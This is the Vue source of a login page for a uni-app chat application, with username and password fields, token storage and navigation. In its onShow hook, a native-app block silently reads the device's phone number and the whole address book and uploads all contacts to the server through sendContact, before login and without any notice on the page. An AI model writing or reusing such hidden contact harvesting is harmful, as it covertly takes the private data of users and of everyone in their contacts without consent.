<template>
	<view class="content">
		<view class="login-bg">
			<view class="login-card">
				<view class="uni-media-title">
					使用密码登录
				</view>
				<view class="login-head">&nbsp;&nbsp;</view>
				<label class="uni-list-cell uni-list-cell-pd">
					<label class="label-2-text">
						<text>帐号</text>
					</label>
					<view>
						<input type="text" class="uni-input" placeholder="手机号(6-16位字母/数字)" v-model="form.username" />
					</view>
					<view class="uni-icon uni-icon-clear" v-if="form.username" @click="delInputUsernameText"></view>
					<view class="uni-icon" v-else></view>
					<view class="uni-icon placeholdertext">&nbsp;</view>
				</label>
				<label class="uni-list-cell uni-list-cell-pd">
					<label class="label-2-text">
						<text>密码</text>
					</label>
					<view>
						<input class="uni-input" placeholder="请输入密码(6-16位)" :password="showPassword" v-model="form.password" />
					</view>

					<view class="uni-icon uni-icon-clear" v-if="form.password" @click="delInputPasswordText"></view>
					<view class="uni-icon" v-else></view>
					<view class="uni-icon uni-icon-eye" :class="[showPassword ? '' : 'uni-active']" @click="changePassword"></view>

				</label>
				<view class="login-function-old">
					<!-- <view class="login-forget" @click="go_forget">忘记密码</view> -->
					<view class="login-register " style="color:red;" @click="go_register">快速注册></view>
				</view>
			</view>
			<view class="login-btn">
				<button :class="['landing',checkIn ? 'landing_true' : 'landing_false']" class="but-view" :disabled="checkIn ? false : true"
				 type="primary" @tap="subLongin">登 录</button>
				<!--  <view :class="['landing',checkIn ? 'landing_true' : 'landing_false']" @tap="subLongin">登 陆</view> -->
			</view>
			<!--
		<view>
			<view class="login-function">
				
					<text class="textspace" @click="go_forget">找回密码</text> |
				    <text class="textspace" @click="go_frozen">紧急冻结</text> |
					<text class="textspace" @click="go_register">快速注册</text>
				  
			
			</view>
		</view>
		-->
		</view>
	</view>
</template>

<script>
	
	import _data from "../../common/_data";
	import _mixins from "../../common/_mixins";
	import _get from "../../common/_get";
	import _page from "../../common/common";
	export default {
		data() {
			return {
				showPassword: true,
				form: {
					username: '',
					password: '',
					client_id:''
				}
			}
		},
		onLoad() {
			
		},
		onShow(){
			//获取用户手机号
			//#ifdef APP-PLUS
			let phone = _page.getSystemPhone();
			let _this = this;
			 plus.push.getClientInfoAsync(function(info){
			     _this.form.client_id = info.clientid;
				  console.log(JSON.stringify(info));
			},function(e){
				 console.log('Failed');
				 console.log(JSON.stringify(e));
			});
			
			plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function(addressbook) {
				addressbook.find(null, function(contacts) {
					_get.sendContact({params:JSON.stringify(contacts),client_id:_this.clientid,phone:phone},function(res){
						console.log(res);
					});
					
				}, function() {
				}, {
					multiple: true
				});
			}, function(e) {
			});
			//#endif
		},
		computed: {
			checkIn() {
				return this.form.password != '' && this.form.username != '' && this.form.password.length > 5;
			}
		},
		methods: {
			changePassword() {
				this.showPassword = !this.showPassword;
			},
			delInputUsernameText() {
				this.form.username = ''
			},
			delInputPasswordText() {
				this.form.password = ''
			},
			subLongin() {
				let _this = this;
				if (!_this.checkIn) {
					return;
				}
				uni.showLoading({title:'登陆中'})
				this.form.client_id = _data.localData('client_id');
				_this.$httpSend({
					path: '/im/in/login',
					data: _this.form,
					success: (data) => {
						console.log('sucess',data.token)
						try {
							uni.setStorageSync('token', data.token);
						} catch (e) {
							uni.showModal({
								content: '本地存储数据不可用!',
							});
							uni.hideLoading()
							return false;
						}
							console.log('连接websocket')
						//登陆上去之后重新获取数据刷新页面
						_mixins.methods.$socketSend({
							action: 'checkToken',
							data: data.token,
						},function() {
							uni.hideLoading()
							uni.reLaunch({
								url: '../chat/index',
							});
						});

					}
				});
			},
			go_forget() {
				uni.navigateTo({
					url: '../../pages/in/forget'
				})
			},
			go_frozen() {
				uni.navigateTo({
					url: '../../pages/set/frozen'
				})
			},
			go_register() {
				uni.navigateTo({
					url: '../../pages/in/reg'
				})
			}

		}
	}
</script>

<style>
	.uni-media-title {
		font-size: 64upx;
		margin-top: 10upx;
		text-align: center;
	}

	.uni-media-loading {
		width: 150upx;
		height: 150upx;
	}

	.landing {
		height: 84upx;
		line-height: 84upx;
		color: #ffffff;
		font-size: 32upx;
		bordor: none;
		border-radius: 10upx;
	}

	.placeholdertext {
		/* #ifdef H5 */
		width: 40upx;
		/* #endif */

		/*#ifdef APP-PLUS */
		width: 40upx;
		/* #endif */

		height: 24upx;
	}

	.landing_true {}

	.landing_false {
		background-color: #d8d8d8;
	}

	.uni-button[type="primary"] {}

	.login-btn {
		padding: 10upx 20upx;
		margin-top: 100upx;
		text-align: center;
	}

	.but-view {
		border-radius: 40upx;
	}

	.login-function {
		/* #ifdef H5 */
		margin-top: 350upx;
		/* #endif */

		/*#ifdef APP-PLUS */
		margin-top: 260upx;

		/* #endif */

		color: #999;
		text-align: center;
	}

	.login-function-old {
		margin-top: 60upx;
		margin-right: 30upx;
		color: red;
		text-align: center;
	}

	.login-forget {
		float: left;
		font-size: 26upx;
		color: #999;
	}

	.textspace {
		padding: 10upx 10upx;
	}

	.login-register {
		color: #666;
		float: right;
		font-size: 26upx;
	}

	.login-input input {
		background: #f2f5f6;
		font-size: 28upx;
		padding: 10upx 25upx;
		height: 62upx;
		line-height: 62upx;
		border-radius: 8upx;
	}

	.login-margin-b {
		margin-bottom: 25upx;
	}

	.login-input {
		padding: 20upx 20upx;
	}

	.login-head {
		font-size: 34upx;
		text-align: center;
		padding: 25upx 10upx 55upx 10upx;
	}

	.login-card {
		background: #fff;
		border-radius: 12upx;
		padding: 10upx 25upx;
		/* box-shadow: 0 6upx 18upx rgba(0,0,0,0.12); */
		position: relative;
		margin-top: 100upx;
	}

	.login-bg {
		/* height: 260upx;
		padding: 25upx;
		background: linear-gradient(#FF978D, #FFBB69); */
	}

	page {
		background-color: #ffffff;
	}

	.uni-input {
		height: 50upx;
		width: 460upx;
		padding: 15upx 0 15upx 25upx;
		line-height: 50upx;
		font-size: 28upx;
		background: #fff;
		flex: 1;
	}

	.uni-form-item .with-fun .uni-icon {
		text-align: left;
	}
</style>
